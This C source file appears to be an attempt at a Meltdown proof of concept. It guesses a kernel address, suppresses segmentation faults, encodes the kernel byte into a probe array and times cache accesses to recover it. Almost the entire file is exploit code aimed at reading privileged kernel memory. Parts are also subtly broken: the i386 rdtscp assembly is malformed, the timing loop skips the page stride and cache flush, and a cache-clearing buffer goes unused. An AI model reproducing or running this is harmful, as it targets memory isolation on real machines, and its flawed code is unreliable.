#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <setjmp.h>
#include <signal.h>
#include <sys/time.h>
#include <time.h>
//if you read array much larger than the l3 cache it should clear everything except that array

// using https://github.com/IAIK/meltdown/blob/master/libkdump/libkdump.c
// function for getting number of clock cycles since boot
static inline uint64_t rdtsc() {
  uint64_t a = 0, d = 0;
  asm volatile("mfence");
#if defined(USE_RDTSCP) && defined(__x86_64__)
  asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
#elif defined(USE_RDTSCP) && defined(__i386__)
  asm volatile("rdtscp" : "=A"(a), :: "ecx");
#elif defined(__x86_64__)
  asm volatile("rdtsc" : "=a"(a), "=d"(d));
#elif defined(__i386__)
  asm volatile("rdtsc" : "=A"(a));
#endif
  a = (d << 32) | a;
  asm volatile("mfence");
  return a;
}

// defining flush and memory access in low level code for 32 or 64 bit systems
#if defined(__x86_64__)
// ---------------------------------------------------------------------------
static inline void maccess(void *p) {
  asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
}

// ---------------------------------------------------------------------------
static void flush(void *p) {
  asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
}
#else
// ---------------------------------------------------------------------------
static inline void maccess(void *p) {
  asm volatile("movl (%0), %%eax\n" : : "c"(p) : "eax");
}

// ---------------------------------------------------------------------------
static void flush(void *p) {
  asm volatile("clflush 0(%0)\n" : : "c"(p) : "eax");
}
#endif

#define GB *1073741824
jmp_buf buf;
uint8_t kernel_memory = 0;

void signal_manager(int sig) {
    if (sig == SIGSEGV) {
	longjmp(buf, 1);
    }
}



int main() {
	
    unsigned int num;

    signal(SIGSEGV, signal_manager);

    // uint*_t should be one byte big
    uint8_t* probe_array = malloc(256 * 4096 * sizeof(uint8_t));

    
    // get a kernel address
    void* task_size = ((((unsigned long)&num) + 1 GB) / (1 GB)) GB; 
    if (task_size == NULL) { return 2; }
    

    // CLEAR CACHE
    void *clearer = calloc(8, 1024*1024); // 8 MB

    if (!setjmp(buf)) {
	kernel_memory = *(uint8_t*)(task_size);
    	uint64_t final_kernel_memory = kernel_memory * 4096; // 4096 is page size?
    	uint8_t dummy = probe_array[final_kernel_memory];
    }

    // cache timing part
    struct timespec stop, start;
    int i;
    for (i=0; i<256; i++) {    
	clock_gettime(CLOCK_REALTIME, &start);
	probe_array[i];
	clock_gettime(CLOCK_REALTIME, &stop);
	printf("took %lu\n", stop.tv_nsec - start.tv_nsec);
    }

    return 0;
}

